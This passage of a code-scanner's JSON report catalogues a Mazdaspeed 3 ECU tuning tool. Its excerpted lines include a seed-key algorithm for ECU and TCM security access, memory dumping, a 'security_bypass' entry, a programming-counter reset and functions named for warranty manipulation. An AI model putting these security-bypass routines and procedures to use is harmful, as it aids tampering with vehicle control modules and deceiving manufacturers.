"import", "module": "datetime", "line": null}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "matplotlib.backends.backend_tkagg", "line": null}, {"type": "import", "module": "mazda_seed_key", "line": null}, {"type": "import", "module": "race_calibrations", "line": null}, {"type": "import", "module": "dealer_tools", "line": null}, {"type": "import", "module": "ecu_exploiter", "line": null}, {"type": "import", "module": "adaptive_ai", "line": null}, {"type": "import", "module": "mazda_tuning_core", "line": null}, {"type": "import", "module": "tkinter", "line": null}, {"type": "import", "module": "ttk,", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "serial", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "matplotlib.pyplot", "line": null}, {"type": "import", "module": "FigureCanvasTkAgg", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "MazdaSeedKeyAlgorithm", "line": null}, {"type": "import", "module": "MazdaRaceCalibrations,", "line": null}, {"type": "import", "module": "DealerToolAccess", "line": null}, {"type": "import", "module": "MazdaECUExploiter,", "line": null}, {"type": "import", "module": "AdaptiveTuningAI,", "line": null}, {"type": "import", "module": "MazdaSpeed3TuningSoftware", "line": null}], "components_found": [{"type": "class", "name": "MazdaSpeed3TunerGUI", "line": 31}], "algorithms": [], "protocols": [{"type": "protocol", "line": 40, "protocol": "0x[0-9A-Fa-f]+", "content": "self.root.geometry(\"1200x800\")"}, {"type": "protocol", "line": 339, "protocol": "CAN", "content": "\"\"\"CONNECT TO VEHICLE VIA CAN/OBD2\"\"\""}, {"type": "protocol", "line": 339, "protocol": "OBD", "content": "\"\"\"CONNECT TO VEHICLE VIA CAN/OBD2\"\"\""}, {"type": "protocol", "line": 359, "protocol": "0x[0-9A-Fa-f]+", "content": "vin_data = self.ecu_exploiter.dump_ecu_memory(0xFF0000, 17)"}, {"type": "protocol", "line": 364, "protocol": "0x[0-9A-Fa-f]+", "content": "cal_id_data = self.ecu_exploiter.dump_ecu_memory(0xFF8000, 10)"}], "hardware_assumptions": [{"type": "hardware", "line": 28, "hardware": "ECU", "content": "from ecu_exploiter import MazdaECUExploiter, RealTimeTuningSession"}, {"type": "hardware", "line": 43, "hardware": "ECU", "content": "self.ecu_exploiter = MazdaECUExploiter()"}, {"type": "hardware", "line": 50, "hardware": "vehicle", "content": "self.vehicle_data = {}"}, {"type": "hardware", "line": 106, "hardware": "vehicle", "content": "ttk.Button(control_frame, text=\"Connect to Vehicle\","}, {"type": "hardware", "line": 107, "hardware": "vehicle", "content": "command=self.connect_vehicle).pack(side=tk.LEFT, padx=5)"}, {"type": "hardware", "line": 178, "hardware": "vehicle", "content": "mod_frame = ttk.LabelFrame(tuning_frame, text=\"Vehicle Modifications\", padding=10)"}, {"type": "hardware", "line": 197, "hardware": "ECU", "content": "ttk.Button(tune_frame, text=\"Flash ECU\","}, {"type": "hardware", "line": 198, "hardware": "ECU", "content": "command=self.flash_ecu).pack(side=tk.LEFT, padx=5)"}, {"type": "hardware", "line": 338, "hardware": "vehicle", "content": "def connect_vehicle(self):"}, {"type": "hardware", "line": 339, "hardware": "vehicle", "content": "\"\"\"CONNECT TO VEHICLE VIA CAN/OBD2\"\"\""}, {"type": "hardware", "line": 341, "hardware": "vehicle", "content": "self.status_var.set(\"Connecting to vehicle...\")"}, {"type": "hardware", "line": 343, "hardware": "ECU", "content": "if self.ecu_exploiter.connect_can():"}, {"type": "hardware", "line": 344, "hardware": "vehicle", "content": "self.status_var.set(\"Connected to vehicle\")"}, {"type": "hardware", "line": 345, "hardware": "vehicle", "content": "self.logger.info(\"Vehicle connection established\")"}, {"type": "hardware", "line": 348, "hardware": "vehicle", "content": "self.read_vehicle_info()"}, {"type": "hardware", "line": 351, "hardware": "vehicle", "content": "messagebox.showerror(\"Connection Error\", \"Failed to connect to vehicle\")"}, {"type": "hardware", "line": 355, "hardware": "vehicle", "content": "def read_vehicle_info(self):"}, {"type": "hardware", "line": 356, "hardware": "ECU", "content": "\"\"\"READ VEHICLE INFORMATION FROM ECU\"\"\""}, {"type": "hardware", "line": 356, "hardware": "vehicle", "content": "\"\"\"READ VEHICLE INFORMATION FROM ECU\"\"\""}, {"type": "hardware", "line": 359, "hardware": "ECU", "content": "vin_data = self.ecu_exploiter.dump_ecu_memory(0xFF0000, 17)"}, {"type": "hardware", "line": 361, "hardware": "vehicle", "content": "self.vehicle_data['vin'] = vin_data.decode('ascii', errors='ignore')"}, {"type": "hardware", "line": 364, "hardware": "ECU", "content": "cal_id_data = self.ecu_exploiter.dump_ecu_memory(0xFF8000, 10)"}, {"type": "hardware", "line": 366, "hardware": "vehicle", "content": "self.vehicle_data['calibration_id'] = cal_id_data.hex()"}, {"type": "hardware", "line": 368, "hardware": "vehicle", "content": "self.logger.info(f\"Vehicle VIN: {self.vehicle_data.get('vin', 'Unknown')}\")"}, {"type": "hardware", "line": 371, "hardware": "vehicle", "content": "self.logger.error(f\"Error reading vehicle info: {e}\")"}, {"type": "hardware", "line": 397, "hardware": "ECU", "content": "def flash_ecu(self):"}, {"type": "hardware", "line": 398, "hardware": "ECU", "content": "\"\"\"FLASH GENERATED TUNE TO ECU\"\"\""}, {"type": "hardware", "line": 404, "hardware": "ECU", "content": "self.status_var.set(\"Flashing ECU...\")"}, {"type": "hardware", "line": 414, "hardware": "ECU", "content": "self.logger.info(\"ECU flash completed successfully\")"}, {"type": "hardware", "line": 415, "hardware": "ECU", "content": "messagebox.showinfo(\"Success\", \"ECU flashed successfully\")"}, {"type": "hardware", "line": 419, "hardware": "ECU", "content": "self.logger.error(f\"ECU flash failed: {e}\")"}, {"type": "hardware", "line": 448, "hardware": "ECU", "content": "self.ecu_exploiter.real_time_parameter_change('boost_target', 10.0)"}, {"type": "hardware", "line": 449, "hardware": "ECU", "content": "self.ecu_exploiter.real_time_parameter_change('ignition_timing', 8.0)"}, {"type": "hardware", "line": 498, "hardware": "vehicle", "content": "\"\"\"READ SENSOR DATA FROM VEHICLE\"\"\""}, {"type": "hardware", "line": 563, "hardware": "ECU", "content": "\"\"\"RESET ECU ADAPTIVE LEARNING\"\"\""}, {"type": "hardware", "line": 567, "hardware": "ECU", "content": "self.logger.info(\"ECU adaptations reset\")"}], "security_logic": [{"type": "security_pattern", "line": 25, "pattern": "key", "content": "from mazda_seed_key import MazdaSeedKeyAlgorithm"}, {"type": "security_pattern", "line": 25, "pattern": "seed", "content": "from mazda_seed_key import MazdaSeedKeyAlgorithm"}, {"type": "security_pattern", "line": 25, "pattern": "algorithm", "content": "from mazda_seed_key import MazdaSeedKeyAlgorithm"}, {"type": "security_pattern", "line": 131, "pattern": "key", "content": "for i, (label, key, min_val, max_val) in enumerate(parameters):"}, {"type": "security_pattern", "line": 148, "pattern": "key", "content": "self.gauges[key] = {"}, {"type": "security_pattern", "line": 478, "pattern": "key", "content": "for key in self.plot_data:"}, {"type": "security_pattern", "line": 479, "pattern": "key", "content": "self.plot_data[key] = self.plot_data[key][-100:]"}, {"type": "security_pattern", "line": 514, "pattern": "key", "content": "for key, gauge in self.gauges.items():"}, {"type": "security_pattern", "line": 515, "pattern": "key", "content": "if key in sensor_data:"}, {"type": "security_pattern", "line": 516, "pattern": "key", "content": "value = sensor_data[key]"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts6.py", "lines_read": 607, "features_found": [{"type": "function", "name": "main", "line": 540}, {"type": "function", "name": "read_instruction", "line": 31}, {"type": "function", "name": "calculate_ecu_seed_key", "line": 105}, {"type": "function", "name": "calculate_tcm_seed_key", "line": 132}, {"type": "function", "name": "get_race_ignition_maps", "line": 160}, {"type": "function", "name": "get_race_fuel_maps", "line": 204}, {"type": "function", "name": "get_race_boost_maps", "line": 243}, {"type": "function", "name": "execute_manufacturer_mode", "line": 299}, {"type": "function", "name": "get_hidden_menus", "line": 312}, {"type": "function", "name": "warranty_manipulation_procedures", "line": 325}, {"type": "function", "name": "turbo_replacement_procedure", "line": 363}, {"type": "function", "name": "high_pressure_fuel_system_service", "line": 382}, {"type": "function", "name": "transmission_adaptation_reset", "line": 408}, {"type": "function", "name": "__init__", "line": 427}, {"type": "function", "name": "generate_complete_tune", "line": 433}, {"type": "function", "name": "_generate_vvt_maps", "line": 463}, {"type": "function", "name": "_generate_safety_limits", "line": 483}, {"type": "function", "name": "_apply_modification_adjustments", "line": 504}, {"type": "function", "name": "_deep_update", "line": 520}, {"type": "function", "name": "_get_timestamp", "line": 529}, {"type": "function", "name": "_generate_checksum", "line": 534}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "random", "line": null}], "components_found": [{"type": "class", "name": "TuningMode", "line": 15}, {"type": "class", "name": "ECUMemoryAddress", "line": 23}, {"type": "class", "name": "MazdaSeedKeyAlgorithm", "line": 98}, {"type": "class", "name": "MazdaRaceCalibrations", "line": 153}, {"type": "class", "name": "DealerToolAccess", "line": 283}, {"type": "class", "name": "AdvancedDiagnosticProcedures", "line": 356}, {"type": "class", "name": "MazdaSpeed3TuningSoftware", "line": 421}], "algorithms": [{"type": "algorithm_function", "line": 105, "content": "def calculate_ecu_seed_key(seed: str) -> str:"}, {"type": "algorithm_function", "line": 132, "content": "def calculate_tcm_seed_key(seed: str) -> str:"}], "protocols": [{"type": "protocol", "line": 32, "protocol": "OBD", "content": "\"\"\"GENERATE OBD2 READ INSTRUCTION FOR THIS ADDRESS\"\"\""}, {"type": "protocol", "line": 33, "protocol": "0x[0-9A-Fa-f]+", "content": "return f\"0x23 {self.address:06X} {self.size:04X}\""}, {"type": "protocol", "line": 39, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Base Ignition Timing\", 0xFFA000, 256,"}, {"type": "protocol", "line": 43, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Ignition Advance\", 0xFFA100, 256,"}, {"type": "protocol", "line": 49, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Base Fuel Map\", 0xFFA800, 256,"}, {"type": "protocol", "line": 53, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Fuel Compensation\", 0xFFA900, 256,"}, {"type": "protocol", "line": 59, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Boost Target Map\", 0xFFB000, 128,"}, {"type": "protocol", "line": 63, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Wastegate Duty Cycle\", 0xFFB080, 128,"}, {"type": "protocol", "line": 69, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Intake VVT Map\", 0xFFB400, 128,"}, {"type": "protocol", "line": 73, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Exhaust VVT Map\", 0xFFB480, 128,"}, {"type": "protocol", "line": 79, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Rev Limiters\", 0xFFB800, 16,"}, {"type": "protocol", "line": 83, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Boost Limits\", 0xFFB810, 16,"}, {"type": "protocol", "line": 89, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Knock Learning\", 0xFFC000, 512,"}, {"type": "protocol", "line": 93, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Fuel Trim Learning\", 0xFFC200, 512,"}, {"type": "protocol", "line": 107, "protocol": "0x[0-9A-Fa-f]+", "content": "Calculate security key for ECU access (Service 0x27)"}, {"type": "protocol", "line": 121, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = seed_bytes[i] ^ 0x73"}, {"type": "protocol", "line": 123, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + i) & 0xFF"}, {"type": "protocol", "line": 125, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0xA9"}, {"type": "protocol", "line": 127, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (temp + 0x1F) & 0xFF"}, {"type": "protocol", "line": 146, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "protocol", "line": 147, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "protocol", "line": 148, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] ^= 0x47"}, {"type": "protocol", "line": 149, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] ^= 0x11"}, {"type": "protocol", "line": 347, "protocol": "J2534", "content": "\"Use advanced J2534 tool\","}], "hardware_assumptions": [{"type": "hardware", "line": 23, "hardware": "ECU", "content": "class ECUMemoryAddress:"}, {"type": "hardware", "line": 24, "hardware": "ECU", "content": "\"\"\"ECU MEMORY ADDRESS MAPPING - MAZDASPEED 3 SPECIFIC\"\"\""}, {"type": "hardware", "line": 36, "hardware": "ECU", "content": "ECU_MEMORY_MAP = {"}, {"type": "hardware", "line": 38, "hardware": "ECU", "content": "\"ignition_base\": ECUMemoryAddress("}, {"type": "hardware", "line": 42, "hardware": "ECU", "content": "\"ignition_advance\": ECUMemoryAddress("}, {"type": "hardware", "line": 48, "hardware": "ECU", "content": "\"fuel_base\": ECUMemoryAddress("}, {"type": "hardware", "line": 52, "hardware": "ECU", "content": "\"fuel_compensation\": ECUMemoryAddress("}, {"type": "hardware", "line": 58, "hardware": "ECU", "content": "\"boost_target\": ECUMemoryAddress("}, {"type": "hardware", "line": 62, "hardware": "ECU", "content": "\"wastegate_duty\": ECUMemoryAddress("}, {"type": "hardware", "line": 68, "hardware": "ECU", "content": "\"vvt_intake\": ECUMemoryAddress("}, {"type": "hardware", "line": 72, "hardware": "ECU", "content": "\"vvt_exhaust\": ECUMemoryAddress("}, {"type": "hardware", "line": 78, "hardware": "ECU", "content": "\"rev_limit\": ECUMemoryAddress("}, {"type": "hardware", "line": 82, "hardware": "ECU", "content": "\"boost_limit\": ECUMemoryAddress("}, {"type": "hardware", "line": 88, "hardware": "ECU", "content": "\"knock_learn\": ECUMemoryAddress("}, {"type": "hardware", "line": 92, "hardware": "ECU", "content": "\"fuel_trim_learn\": ECUMemoryAddress("}, {"type": "hardware", "line": 105, "hardware": "ECU", "content": "def calculate_ecu_seed_key(seed: str) -> str:"}, {"type": "hardware", "line": 107, "hardware": "ECU", "content": "Calculate security key for ECU access (Service 0x27)"}, {"type": "hardware", "line": 110, "hardware": "ECU", "content": "seed: 4-byte hex string from ECU (e.g., \"A1B2C3D4\")"}, {"type": "hardware", "line": 113, "hardware": "ECU", "content": "4-byte hex key for security access"}, {"type": "hardware", "line": 132, "hardware": "TCM", "content": "def calculate_tcm_seed_key(seed: str) -> str:"}, {"type": "hardware", "line": 134, "hardware": "ECU", "content": "Calculate security key for Transmission Control Module"}, {"type": "hardware", "line": 137, "hardware": "TCM", "content": "seed: 2-byte hex string from TCM"}, {"type": "hardware", "line": 140, "hardware": "TCM", "content": "2-byte hex key for TCM access"}, {"type": "hardware", "line": 294, "hardware": "ECU", "content": "\"security_reset\": \"SEC-RES-MAZDA-2024\","}, {"type": "hardware", "line": 299, "hardware": "ECU", "content": "def execute_manufacturer_mode(access_code: str) -> bool:"}, {"type": "hardware", "line": 321, "hardware": "ECU", "content": "\"security_bypass\": \"Special key sequence during boot\""}, {"type": "hardware", "line": 335, "hardware": "ECU", "content": "\"Navigate to 'Service Functions' -> 'ECU Reset'\","}, {"type": "hardware", "line": 337, "hardware": "ECU", "content": "\"Execute with ignition ON, engine OFF\","}, {"type": "hardware", "line": 344, "hardware": "ECU", "content": "\"purpose\": \"Reset ECU programming counter\","}, {"type": "hardware", "line": 388, "hardware": "ECU", "content": "\"purpose\": \"Program injector flow rates to ECU\","}, {"type": "hardware", "line": 410, "hardware": "TCM", "content": "Reset TCM adaptation for clutch replacement or issues"}, {"type": "hardware", "line": 413, "hardware": "TCM", "content": "\"1. Connect diagnostic tool with TCM access\","}, {"type": "hardware", "line": 417, "hardware": "vehicle", "content": "\"5. Drive vehicle: 0-30 mph light throttle, 30-0 mph coast down\","}, {"type": "hardware", "line": 505, "hardware": "vehicle", "content": "\"\"\"Apply adjustments based on vehicle modifications\"\"\""}, {"type": "hardware", "line": 521, "hardware": "ECU", "content": "\"\"\"Recursively update nested dictionaries\"\"\""}, {"type": "hardware", "line": 550, "hardware": "ECU", "content": "print(\"\\n1. SECURITY ACCESS - SEED-KEY ALGORITHM\")"}, {"type": "hardware", "line": 553, "hardware": "ECU", "content": "ecu_key = software.seed_key.calculate_ecu_seed_key(test_seed)"}, {"type": "hardware", "line": 554, "hardware": "TCM", "content": "tcm_key = software.seed_key.calculate_tcm_seed_key(\"1A2B\")"}, {"type": "hardware", "line": 555, "hardware": "ECU", "content": "print(f\"ECU Seed: {test_seed} -> Key: {ecu_key}\")"}, {"type": "hardware", "line": 556, "hardware": "TCM", "content": "print(f\"TCM Seed: 1A2B -> Key: {tcm_key}\")"}, {"type": "hardware", "line": 581, "hardware": "ECU", "content": "manufacturer_access = software.dealer_tool.execute_manufacturer_mode("}, {"type": "hardware", "line": 596, "hardware": "ECU", "content": "print(\"\\n5. ECU MEMORY MAP ACCESS\")"}, {"type": "hardware", "line": 598, "hardware": "ECU", "content": "ignition_map = ECU_MEMORY_MAP[\"ignition_base\"]"}], "security_logic": [{"type": "security_pattern", "line": 9, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 98, "pattern": "key", "content": "class MazdaSeedKeyAlgorithm:"}, {"type": "security_pattern", "line": 98, "pattern": "seed", "content": "class MazdaSeedKeyAlgorithm:"}, {"type": "security_pattern", "line": 98, "pattern": "algorithm", "content": "class MazdaSeedKeyAlgorithm:"}, {"type": "security_pattern", "line": 100, "pattern": "key", "content": "COMPLETE SEED-KEY ALGORITHM IMPLEMENTATION"}, {"type": "security_pattern", "line": 100, "pattern": "seed", "content": "COMPLETE SEED-KEY ALGORITHM IMPLEMENTATION"}, {"type": "security_pattern", "line": 100, "pattern": "algorithm", "content": "COMPLETE SEED-KEY ALGORITHM IMPLEMENTATION"}, {"type": "security_pattern", "line": 105, "pattern": "key", "content": "def calculate_ecu_seed_key(seed: str) -> str:"}, {"type": "security_pattern", "line": 105, "pattern": "seed", "content": "def calculate_ecu_seed_key(seed: str) -> str:"}, {"type": "security_pattern", "line": 107, "pattern": "key", "content": "Calculate security key for ECU access (Service 0x27)"}, {"type": "security_pattern", "line": 110, "pattern": "seed", "content": "seed: 4-byte hex string from ECU (e.g., \"A1B2C3D4\")"}, {"type": "security_pattern", "line": 113, "pattern": "key", "content": "4-byte hex key for security access"}, {"type": "security_pattern", "line": 115, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 116, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 121, "pattern": "seed", "content": "temp = seed_bytes[i] ^ 0x73"}, {"type": "security_pattern", "line": 127, "pattern": "key", "content": "key[i] = (temp + 0x1F) & 0xFF"}, {"type": "security_pattern", "line": 129, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 132, "pattern": "key", "content": "def calculate_tcm_seed_key(seed: str) -> str:"}, {"type": "security_pattern", "line": 132, "pattern": "seed", "content": "def calculate_tcm_seed_key(seed: str) -> str:"}, {"type": "security_pattern", "line": 134, "pattern": "key", "content": "Calculate security key for Transmission Control Module"}, {"type": "security_pattern", "line": 137, "pattern": "seed", "content": "seed: 2-byte hex string from TCM"}, {"type": "security_pattern", "line": 140, "pattern": "key", "content": "2-byte hex key for TCM access"}, {"type": "security_pattern", "line": 142, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 143, "pattern": "key", "content": "key = bytearray(2)"}, {"type": "security_pattern", "line": 146, "pattern": "key", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 146, "pattern": "seed", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 147, "pattern": "key", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 147, "pattern": "seed", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 148, "pattern": "key", "content": "key[0] ^= 0x47"}, {"type": "security_pattern", "line": 149, "pattern": "key", "content": "key[1] ^= 0x11"}, {"type": "security_pattern", "line": 151, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 321, "pattern": "key", "content": "\"security_bypass\": \"Special key sequence during boot\""}, {"type": "security_pattern", "line": 428, "pattern": "key", "content": "self.seed_key = MazdaSeedKeyAlgorithm()"}, {"type": "security_pattern", "line": 428, "pattern": "seed", "content": "self.seed_key = MazdaSeedKeyAlgorithm()"}, {"type": "security_pattern", "line": 428, "pattern": "algorithm", "content": "self.seed_key = MazdaSeedKeyAlgorithm()"}, {"type": "security_pattern", "line": 522, "pattern": "key", "content": "for key, value in update.items():"}, {"type": "security_pattern", "line": 523, "pattern": "key", "content": "if isinstance(value, dict) and key in original:"}, {"type": "security_pattern", "line": 524, "pattern": "key", "content": "original[key] = self._deep_update(original[key], value)"}, {"type": "security_pattern", "line": 526, "pattern": "key", "content": "original[key] = value"}, {"type": "security_pattern", "line": 537, "pattern": "hash", "content": "return hashlib.md5(str(random.getrandbits(256)).encode()).hexdigest()[:16]"}, {"type": "security_pattern", "line": 550, "pattern": "key", "content": "print(\"\\n1. SECURITY ACCESS - SEED-KEY ALGORITHM\")"}, {"type": "security_pattern", "line": 550, "pattern": "seed", "content": "print(\"\\n1. SECURITY ACCESS - SEED-KEY ALGORITHM\")"}, {"type": "security_pattern", "line": 550, "pattern": "algorithm", "content": "print(\"\\n1. SECURITY ACCESS - SEED-KEY ALGORITHM\")"}, {"type": "security_pattern", "line": 552, "pattern": "seed", "content": "test_seed = \"A1B2C3D4\""}, {"type": "security_pattern", "line": 553, "pattern": "key", "content": "ecu_key = software.seed_key.calculate_ecu_seed_key(test_seed)"}, {"type": "security_pattern", "line": 553, "pattern": "seed", "content": "ecu_key = software.seed_key.calculate_ecu_seed_key(test_seed)"}, {"type": "security_pattern", "line": 554, "pattern": "key", "content": "tcm_key = software.seed_key.calculate_tcm_seed_key(\"1A2B\")"}, {"type": "security_pattern", "line": 554, "pattern": "seed", "content": "tcm_key = software.seed_key.calculate_tcm_seed_key(\"1A2B\")"}, {"type": "security_pattern", "line": 555, "pattern": "key", "content": "print(f\"ECU Seed: {test_seed} -> Key: {ecu_key}\")"}, {"type": "security_pattern", "line": 555, "pattern": "seed", "content": "print(f\"ECU Seed: {test_seed} -> Key: {ecu_key}\")"}, {"type": "security_pattern", "line": 556, "pattern": "key", "content": "print(f\"TCM Seed: 1A2B -> Key: {tcm_key}\")"}, {"type": "security_pattern", "line": 556, "pattern": "seed", "content": "print(f\"TCM Seed: 1A2B -> Key: {tcm_key}\")"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts7.py", "lines_read": 720, "features_found": [{"type": "function", "name": "main", "line": 703}, {"type": "function", "name": "__init__", "line": 37}, {"type": "function", "name": "setup_logging", "line": 62}, {"type": "function", "name": "create_interface", "line": 74}, {"type": "function", "name": "setup_dashboard_tab", "line": 90}, {"type": "function", "name": "create_gauges", "line": 117}, {"type": "function", "name": "setup_tuning_tab", "line": 155}, {"type": "function", "name": "setup_diagnostics_tab", "line": 209}, {"type": "function", "name": "setup_race_tab", "line": 236}, {"type": "function", "name": "setup_logs_tab", "line": 267}, {"type": "function", "name": "setup_status_bar", "line": 285}, {"type": "function", "name": "setup_plots", "line": 295}, {"type": "function", "name": "update_plots", "line": 309}, {"type": "function", "name": "connect_vehicle", "line": 338}, {"type": "function", "name": "read_vehicle_info", "line": 355}, {"type": "function", "name": "generate_tune", "line": 373}, {"type": "function", "name": "flash_ecu", "line": 397}, {"type": "function", "name": "start_real_time_tuning", "line": 424}, {"type": "function", "name": "emergency_stop", "line": 441}, {"type": "function", "name": "start_logging", "line": 457}, {"type": "function", "name": "read_sensor_data", "line": 497}, {"type": "function", "name": "update_gauges", "line": 512}, {"type": "function", "name": "read_dtcs", "line": 525}, {"type": "function", "name": "clear_dtcs", "line": 547}, {"type": "function", "name": "reset_adaptations", "line": 562}, {"type": "function", "name": "turbo_service", "line": 573}, {"type": "function", "name": "fuel_system_service", "line": 585}, {"type": "function", "name": "enable_launch_control", "line": 598}, {"type": "function", "name": "enable_flat_shift", "line": 614}, {"type": "function", "name": "enable_antilag", "line": 625}, {"type": "function", "name": "export_logs", "line": 650}, {"type": "function", "name": "clear_logs", "line": 664}, {"type": "function", "name": "start_background_tasks", "line": 671}, {"type": "function", "name": "on_closing", "line": 695}, {"type": "function", "name": "connect_thread", "line": 340}, {"type": "function", "name": "flash_thread", "line": 403}, {"type": "function", "name": "start_session", "line": 432}, {"type": "function", "name": "logging_thread", "line": 459}, {"type": "function", "name": "read_dtcs_thread", "line": 527}, {"type": "function", "name": "clear_dtcs_thread", "line": 549}, {"type": "function", "name": "status_monitor", "line": 673}, {"type": "import", "module": "tkinter", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "matplotlib.backends.backend_tkagg", "line": null}, {"type": "import", "module": "mazda_seed_key", "line": null}, {"type": "import", "module": "race_calibrations", "line": null}, {"type": "import", "module": "dealer_tools", "line": null}, {"type": "import", "module": "ecu_exploiter", "line": null}, {"type": "import", "module": "adaptive_ai", "line": null}, {"type": "import", "module": "mazda_tuning_core", "line": null}, {"type": "import", "module": "tkinter", "line": null}, {"type": "import", "module": "ttk,", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "serial", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "matplotlib.pyplot", "line": null}, {"type": "import", "module": "FigureCanvasTkAgg", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "MazdaSeedKeyAlgorithm", "line": null}, {"type": "import", "module": "MazdaRaceCalibrations,", "line": null}, {"type": "import", "module": "DealerToolAccess", "line": null}, {"type": "import", "module": "MazdaECUExploiter,", "line": null}, {"type": "import", "module": "AdaptiveTuningAI,", "line": null}, {"type": "import", "module": "MazdaSpeed3TuningSoftware", "line": null}], "components_found": [{"type": "class", "name": "MazdaSpeed3TunerGUI", "line": 31}], "algorithms": [], "protocols": [{"type": "protocol", "line": 40, "protocol": "0x[0-9A-Fa-f]+", "content": "self.root.geometry(\"1200x800\")"}, {"type": "protocol", "line": 339, "protocol": "CAN", "content": "\"\"\"CONNECT TO VEHICLE VIA CAN/OBD2\"\"\""}, {"type": "protocol", "line": 339, "protocol": "OBD", "content": "\"\"\"CONNECT TO VEHICLE VIA CAN/OBD2\"\"\""}, {"type": "protocol", "line": 359, "protocol": "0x[0-9A-Fa-f]+", "content": "vin_data = self.ecu_exploiter.dump_ecu_memory(0xFF0000, 17)"}, {"type": "protocol", "line": 364, "protocol": "0x[0-9A-Fa-f]+", "content": "cal_id_data = self.ecu_exploiter.dump_ecu_memory(0xFF8000, 10)"}], "hardware_assumptions": [{"type": "hardware", "line": 28, "hardware": "ECU", "content": "from ecu_exploiter import MazdaECUExploiter, RealTimeTuningSession"}, {"type": "hardware", "line": 43, "hardware": "ECU", "content": "self.ecu_exploiter = MazdaECUExploiter()"}, {"type": "hardware", "line": 50, "hardware": "vehicle", "content": "self.vehicle_data = {}"}, {"type": "hardware", "line": 106, "hardware": "vehicle", "content": "ttk.Button(control_frame, text=\"Connect to Vehicle\","}, {"type": "hardware", "line": 107, "hardware": "vehicle", "content": "command=self.connect_vehicle).pack(side=tk.LEFT, padx=5)"}, {"type": "hardware", "line": 178, "hardware": "vehicle", "content": "mod_frame = ttk.LabelFrame(tuning_frame, text=\"Vehicle Modifications\", padding=10)"}, {"type": "hardware", "line": 197, "hardware": "ECU", "content": "ttk.Button(tune_frame, text=\"Flash ECU\","}, {"type": "hardware", "line": 198, "hardware": "ECU", "content": "command=self.flash_ecu).pack(side=tk.LEFT, padx=5)"}, {"type": "hardware", "line": 338, "hardware": "vehicle", "content": "def connect_vehicle(self):"}, {"type": "hardware", "line": 339, "hardware": "vehicle", "content": "\"\"\"CONNECT TO VEHICLE VIA CAN/OBD2\"\"\""}, {"type": "hardware", "line": 341, "hardware": "vehicle", "content": "self.status_var.set(\"Connecting to vehicle...\")"}, {"type": "hardware", "line": 343, "hardware": "ECU", "content": "if self.ecu_exploiter.connect_can():"}, {"type": "hardware", "line": 344, "hardware": "vehicle", "content": "self.status_var.set(\"Connected to vehicle\")"}, {"type": 